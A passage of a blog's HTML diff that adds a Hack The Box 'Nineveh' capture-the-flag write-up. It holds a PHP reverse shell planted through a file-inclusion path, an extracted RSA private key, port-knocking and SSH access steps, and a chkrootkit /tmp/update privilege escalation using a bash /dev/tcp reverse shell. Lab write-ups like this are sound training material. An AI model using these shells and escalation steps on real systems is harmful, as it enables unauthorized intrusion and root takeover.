<span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Cannot fork&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span> <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Error: Cannot setsid()&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span><span class="p">);</span> <span class="p">}</span> <span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">);</span> <span class="nx">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$sock</span> <span class="o">=</span> <span class="nx">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$errstr</span><span class="s2"> (</span><span class="si">$errno</span><span class="s2">)&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">),</span> <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">),</span> <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;pipe&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">));</span> <span class="nv">$process</span> <span class="o">=</span> <span class="nx">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Cannot spawn shell&#34;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;Successfully opened reverse shell to </span><span class="si">$ip</span><span class="s2">:</span><span class="si">$port</span><span class="s2">&#34;</span><span class="p">);</span> <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell connection terminated&#34;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;ERROR: Shell process terminated&#34;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nx">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK READ&#34;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;SOCK: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT READ&#34;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDOUT: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR READ&#34;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&#34;STDERR: </span><span class="si">$input</span><span class="s2">&#34;</span><span class="p">);</span> <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="p">}</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="nx">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="nx">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span> <span class="k">function</span> <span class="nf">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s2">&#34;</span><span class="si">$string\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="cp">?&gt;</span>
+</code></pre></div></p>
+
+<p>On our side, we set up our listener and then visit <a href="http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/somename.php" target="_blank">http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/somename.php</a></p>
+
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nc -lvp 60002
+nc: listening on 0.0.0.0 60002 ...
+nc: connect to 10.10.15.203 60002 from nineveh.htb (10.10.10.43) 36908 [36908]
+nc: using stream socket
+Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 09:05:41 up 26 min,  2 users,  load average: 0.27, 0.18, 0.11
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+amrois   pts/0    10.10.15.203     08:53    4:05   0.08s  0.08s -bash
+amrois   pts/1    10.10.15.82      09:05   29.00s  0.04s  0.04s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@nineveh:/$</code></pre></div></div>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<h2 id="user-amrois">User amrois</h2>
+
+<p>If we visit <a href="https://nineveh.htb/secure_notes/" target="_blank">https://nineveh.htb/secure_notes/</a> we see a large image: <a href="https://nineveh.htb/secure_notes/nineveh.png" target="_blank">https://nineveh.htb/secure_notes/nineveh.png</a>
+If we download it and run</p>
+
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ strings nineveh.png</code></pre></div></div>
+
+<p>we discover, hidden inside the file, this private key:
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
+H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
+PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
+FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
+3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
+X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
+KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
+FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
+GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
+JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
+9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
+Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
+ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
+1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
+vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
+DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
+P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
+fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
+tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
+iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
+MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
+PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
+i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
+il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
+fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
+-----END RSA PRIVATE KEY-----</code></pre></div></p>
+
+<p>Save the private key to a file and chmod 600 it.
+Now we have to do some port knocking in order to open SSH port 22. We can find this information and the correct port combination by reading either /etc/knockd.conf or /var/mail/amrois
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ls -al /etc/knockd.conf 
+-rw-r--r-- 1 root root 354 Aug  5 02:06 /etc/knockd.con
+
+$ cat knockd.conf
+[options]
+ logfile = /var/log/knockd.log
+ interface = ens33
+
+[openSSH]
+ sequence = 571, 290, 911 
+ seq_timeout = 5
+ start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+
+[closeSSH]
+ sequence = 911,290,571
+ seq_timeout = 5
+ start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+
+
+$ ls -al /var/mail/amrois
+-rw-r--r-- 1 amrois mail 483 Jul  2 18:46 /var/mail/amrois
+
+$ cat /var/mail/amrois
+amrois@nineveh:/var/mail$ cat amrois
+From root@nineveh.htb  Fri Jun 23 14:04:19 2017
+Return-Path: &lt;root@nineveh.htb&gt;
+X-Original-To: amrois
+Delivered-To: amrois@nineveh.htb
+Received: by nineveh.htb (Postfix, from userid 1000)
+        id D289B2E3587; Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
+To: amrois@nineveh.htb
+From: root@nineveh.htb
+Subject: Another Important note!
+Message-Id: &lt;20170623190419.D289B2E3587@nineveh.htb&gt;
+Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
+
+Amrois! please knock the door next time! 571 290 911</code></pre></div></div></p>
+
+<p>Therefore we can connect from outside like this:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">knock 10.10.10.43 571 290 911 &amp;&amp; ssh -i sshprivkey.txt amrois@10.10.10.43</code></pre></div></div>
+OR you can connect from inside your shell like that:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -i sshprivatekey.txt amrois@localhost</code></pre></div></div></p>
+
+<h2 id="root">Root</h2>
+
+<p>We see this interesting folder:</p>
+
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">amrois@nineveh:/$ ls -al /
+...
+drwxr-xr-x   2 amrois amrois  4096 Dec 16 08:54 report
+...</code></pre></div></div>
+
+<p>Inside this folder, we find some reports which are generated by chkrootkit:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">amrois@nineveh:/$ cd report/
+amrois@nineveh:/report$ ls -al
+total 48
+drwxr-xr-x  2 amrois amrois 4096 Dec 17 05:54 .
+drwxr-xr-x 24 root   root   4096 Jul  2 21:07 ..
+-rw-r--r--  1 amrois amrois 4807 Dec 17 05:50 report-17-12-17:05:50.txt
+-rw-r--r--  1 amrois amrois 4807 Dec 17 05:51 report-17-12-17:05:51.txt
+-rw-r--r--  1 amrois amrois 4807 Dec 17 05:52 report-17-12-17:05:52.txt
+-rw-r--r--  1 amrois amrois 4807 Dec 17 05:53 report-17-12-17:05:53.txt
+-rw-r--r--  1 amrois amrois 4807 Dec 17 05:54 report-17-12-17:05:54.txt
+
+amrois@nineveh:/report$ cat report-17-12-17:05:51.txt
+...</code></pre></div></div></p>
+
+<p>Let&rsquo;s search exploits for chkrootkit:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$searchsploit chkrootkit -w
+
+Chkrootkit - Local Priv Escalation (Metasploit) https://www.exploit-db.com/exploits/38775/
+Chkrootkit 0.49 - Local Privilege Escalation    https://www.exploit-db.com/exploits/33899/</code></pre></div></div></p>
+
+<p>Nice! Chkrootkit before 0.50 will run any executable file named /tmp/update as root, allowing a trivial priv esc.
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nano /tmp/update
+    #!/bin/bash
+    bash -i &gt;&amp; /dev/tcp/10.10.15.203/60000 0&gt;&amp;1
+$ chmod +x /tmp/update</code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nc -lvp 60000
+nc: listening on 0.0.0.0 60000 ...
+nc: connect to 10.10.15.203 60000 from nineveh.htb (10.10.10.43) 60706 [60706]
+nc: using stream socket
+
+root@nineveh:~#</code></pre></div></div></p>
+
+<p>Let&rsquo;s explore those cron jobs a little:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">root@nineveh:~# <span class="nb">cd</span> /var/spool/cron/crontabs
+root@nineveh:/var/spool/cron/crontabs# ls -al
+-rw------- <span class="m">1</span> amrois crontab <span class="m">1129</span> Jul  <span class="m">2</span> <span class="m">19</span>:59 amrois
+-rw------- <span class="m">1</span> root   crontab <span class="m">1120</span> Jul  <span class="m">2</span> <span class="m">19</span>:59 root
+
+root@nineveh:/var/spool/cron/crontabs# tail -n2 amrois
+*/10 * * * * /usr/sbin/report-reset.sh
+
+root@nineveh:/var/spool/cron/crontabs# cat /usr/sbin/report-reset.sh
+<span class="cp">#!/bin/bash
+</span><span class="cp"></span>rm -rf /report/*.txt
+
+root@nineveh:/var/spool/cron/crontabs# tail -n2 root
+*/1 * * * * /root/vulnScan.sh
+
+root@nineveh:/var/spool/cron/crontabs# cat /root/vulnScan.sh
+<span class="cp">#!/bin/bash
+</span><span class="cp"></span>/usr/bin/chkrootkit &gt; /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M<span class="sb">`</span>.txt
+chown amrois:amrois /report/report-<span class="sb">`</span>date +%y-%m-%d:%H:%M<span class="sb">`</span>.txt</code></pre></div></div></p>
+
+<p>That&rsquo;s all folks! :)</p>
 
         </div>
 
         <aside>
           <div class="p-share centered">
-            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2ffast_commit_push%2f&t=Git%20%26%20Mercurial%3a%20How%20to%20commit-push%20fast%20and%20easily" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
-            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2ffast_commit_push%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
-            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2ffast_commit_push%2f&text=Git%20%26%20Mercurial%3a%20How%20to%20commit-push%20fast%20and%20easily&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2ffast_commit_push%2f&text=Git%20%26%20Mercurial%3a%20%ce%a0%cf%89%cf%82%20%ce%bd%ce%b1%20%ce%ba%ce%ac%ce%bd%ce%b5%cf%84%ce%b5%20commit-push%20%ce%b3%cf%81%ce%ae%ce%b3%ce%bf%cf%81%ce%b1%20%ce%ba%ce%b1%ce%b9%20%ce%b5%cf%8d%ce%ba%ce%bf%ce%bb%ce%b1&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2ffast_commit_push%2f&description=Git%20%26%20Mercurial%3a%20How%20to%20commit-push%20fast%20and%20easily&media=https://alamot.github.io/images/binary_flow.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
-            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2ffast_commit_push%2f&description=Git%20%26%20Mercurial%3a%20%ce%a0%cf%89%cf%82%20%ce%bd%ce%b1%20%ce%ba%ce%ac%ce%bd%ce%b5%cf%84%ce%b5%20commit-push%20%ce%b3%cf%81%ce%ae%ce%b3%ce%bf%cf%81%ce%b1%20%ce%ba%ce%b1%ce%b9%20%ce%b5%cf%8d%ce%ba%ce%bf%ce%bb%ce%b1&media=https://alamot.github.io/images/binary_flow.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fnineveh_writeup%2f&t=Nineveh%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
+            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2fnineveh_writeup%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
+            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fnineveh_writeup%2f&text=Nineveh%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fnineveh_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Nineveh&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fnineveh_writeup%2f&description=Nineveh%20write-up&media=https://alamot.github.io/images/nineveh.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fnineveh_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Nineveh&media=https://alamot.github.io/images/nineveh.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
           </div>
         </aside>
       </article>
@@ -370,6 +754,22 @@ hg push</code></pre></div>
           
            
            
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -395,21 +795,61 @@ hg push</code></pre></div>
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
           
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Nineveh write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">17 Dec 2017</time>
-      <time lang="el">17 Δεκ 2017</time>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
     </footer>
   </a>
 </article>
@@ -427,13 +867,21 @@ hg push</code></pre></div>
            
            
            
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
+      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Oct 2016</time>
+      <time lang="el">17 Οκτ 2016</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -889,57 +1337,17 @@ hg push</code></pre></div>
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/test_encodings/" class="clearfix">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/encodings.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">How to determine the character encoding of a text file</h3>
-      <h3 class="title" lang="el">Πως να αναγνωρίσετε την κωδικοποίηση χαρακτήρων ενός αρχείου κειμένου</h3>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">21 Oct 2016</time>
-      <time lang="el">21 Οκτ 2016</time>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
     </footer>
   </a>
 </article>
